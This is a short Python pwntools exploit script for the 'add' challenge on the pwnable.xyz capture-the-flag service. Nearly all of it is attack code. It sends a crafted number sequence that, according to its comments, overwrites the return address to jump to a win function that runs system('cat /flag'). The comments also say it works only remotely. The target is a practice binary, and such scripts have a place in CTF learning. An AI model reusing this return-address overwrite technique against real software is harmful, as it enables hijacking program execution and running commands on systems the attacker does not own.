#!/usr/bin/env python3
from pwn import *
from sys import argv
import pwnlib; pwnlib.args.SILENT(True)

HOST = "svc.pwnable.xyz"
PORT = 30002
PATH = "./add"

p = remote(HOST, PORT) if(len(argv) > 1 and argv[1].lower() == "remote") else process(PATH)

p.recvuntil(b": ")
p.sendline(b"2098193 2098193 13")
p.recv()
p.sendline(b'a')
try:
	print(p.recv().decode())
except EOFError:
	print("This exploit only works remotely for some reason :p")
	print("Might have to do with pwn/python. running the payload, which overwrites the return")
	print("address with 0x400822 (win), with gdb attached shows system(\"cat /flag\") is executed.")

	print("\nWill come back to this... at some point")

if(hasattr(p, "kill")):
	p.kill()
else:
	p.close()
